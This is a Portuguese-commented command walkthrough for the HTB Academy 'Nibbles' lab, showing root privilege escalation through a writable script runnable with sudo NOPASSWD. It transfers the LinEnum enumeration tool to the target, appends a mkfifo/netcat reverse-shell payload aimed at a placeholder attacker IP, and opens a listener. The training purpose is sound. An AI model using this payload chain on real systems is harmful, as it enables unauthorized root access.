###############################################################################################################
# HTB Academy - Getting Started
# Section 18 - Nibbles - Privilege Escalation
#
# Objetivo:
# Escalar privilégios do usuário "nibbler" para "root".
#
# Vetor de ataque:
# - O usuário possui permissão sudo sem senha (NOPASSWD).
# - O comando permitido é:
#       /home/nibbler/personal/stuff/monitor.sh
# - O arquivo pertence ao usuário nibbler e também é gravável.
# - Portanto podemos modificar o script e executá-lo como root.
#
# Fluxo utilizado:
#
# Reverse Shell
#        ↓
# Enumeração manual
#        ↓
# Encontrar personal.zip
#        ↓
# Extrair monitor.sh
#        ↓
# Inspecionar monitor.sh
#        ↓
# Executar LinEnum
#        ↓
# Encontrar sudo NOPASSWD
#        ↓
# Confirmar com sudo -l
#        ↓
# Verificar que monitor.sh é editável
#        ↓
# Adicionar Reverse Shell
#        ↓
# Listener Netcat
#        ↓
# sudo monitor.sh
#        ↓
# Root Shell
#        ↓
# root.txt
###############################################################################################################


########################################
# Confirmar shell atual
########################################

whoami
id
pwd


########################################
# Listar arquivos do usuário
########################################

cd /home/nibbler

ls

ls -la


########################################
# Extrair arquivos pessoais
########################################

unzip personal.zip


########################################
# Entrar no diretório criado
########################################

cd personal

ls -la

cd stuff

ls -la


########################################
# Inspecionar monitor.sh
########################################

cat monitor.sh

less monitor.sh

head monitor.sh

tail monitor.sh

file monitor.sh

stat monitor.sh

ls -l monitor.sh


########################################
# Máquina atacante
# Download do LinEnum
########################################

wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh


########################################
# Máquina atacante
# Compartilhar arquivo
########################################

sudo python3 -m http.server 8080


########################################
# Máquina vítima
# Baixar LinEnum
########################################

cd /tmp

wget http://SEU_IP:8080/LinEnum.sh


########################################
# Permissão de execução
########################################

chmod +x LinEnum.sh


########################################
# Executar enumeração automática
########################################

./LinEnum.sh


########################################
# Enumeração manual equivalente
########################################

sudo -l

find / -perm -4000 2>/dev/null

find / -perm -2000 2>/dev/null

getcap -r / 2>/dev/null

find / -writable 2>/dev/null

find / -user root -perm -4000 2>/dev/null

cat /etc/crontab

ls -la /etc/cron*

ps aux

netstat -tulpn

ss -tulpn

env

echo $PATH

uname -a

cat /etc/os-release

hostname

groups

id

history

cat ~/.bash_history

find / -name "*.bak" 2>/dev/null

find / -name "*.conf" 2>/dev/null

find / -name "*.log" 2>/dev/null


########################################
# Confirmar vetor encontrado
########################################

sudo -l

# Resultado esperado:
#
# User nibbler may run:
#
# (root) NOPASSWD:
# /home/nibbler/personal/stuff/monitor.sh


########################################
# Confirmar permissões do script
########################################

cd /home/nibbler/personal/stuff

ls -l monitor.sh

stat monitor.sh


########################################
# Backup do script
########################################

cp monitor.sh monitor.sh.bak


########################################
# Adicionar payload ao final
########################################

echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc SEU_IP 8443 >/tmp/f' | tee -a monitor.sh


########################################
# Confirmar alteração
########################################

tail monitor.sh

cat monitor.sh


########################################
# Máquina atacante
# Abrir listener
########################################

nc -lvnp 8443


########################################
# Executar script como root
########################################

sudo /home/nibbler/personal/stuff/monitor.sh


########################################
# Confirmar shell root
########################################

whoami

id

hostname

pwd


########################################
# Capturar flag
########################################

cat /root/root.txt


########################################
# Arquivos importantes descobertos
########################################

/home/nibbler/personal.zip

/home/nibbler/personal/stuff/monitor.sh

/root/root.txt


########################################
# Ferramentas utilizadas durante o laboratório
########################################

unzip
wget
python3 -m http.server
chmod
cat
less
head
tail
ls
stat
file
sudo
sudo -l
tee
cp
nc
whoami
id
pwd
hostname
groups
env
history
find
getcap
netstat
ss
ps
uname


########################################
# Indicadores encontrados pelo LinEnum
########################################

# Kernel

uname -a

# Sistema Operacional

cat /etc/os-release

# Usuário Atual

id

# Permissões sudo

sudo -l

# Binários SUID

find / -perm -4000 2>/dev/null

# Binários SGID

find / -perm -2000 2>/dev/null

# Linux Capabilities

getcap -r / 2>/dev/null

# Cron Jobs

cat /etc/crontab

ls -la /etc/cron*

# Processos

ps aux

# Serviços escutando

ss -tulpn

netstat -tulpn

# Variáveis de ambiente

env

echo $PATH

# Histórico

history

cat ~/.bash_history


###############################################################################################################
# RESUMO DO VETOR DE ESCALADA
#
# 1. Obtivemos shell como nibbler.
#
# 2. Encontramos monitor.sh dentro do personal.zip.
#
# 3. O script pertence ao usuário nibbler.
#
# 4. O usuário possui permissão de escrita no arquivo.
#
# 5. O LinEnum encontrou:
#
#       sudo NOPASSWD:
#       /home/nibbler/personal/stuff/monitor.sh
#
# 6. Conclusão:
#
#       Arquivo editável
#             +
#       Executado como root
#
#              =
#
#       Execução arbitrária de comandos como root.
#
# 7. Inserimos uma Reverse Shell no final do script.
#
# 8. Executamos:
#
#       sudo monitor.sh
#
# 9. Recebemos uma shell root.
#
# 10. Lemos:
#
#       /root/root.txt
#
###############################################################################################################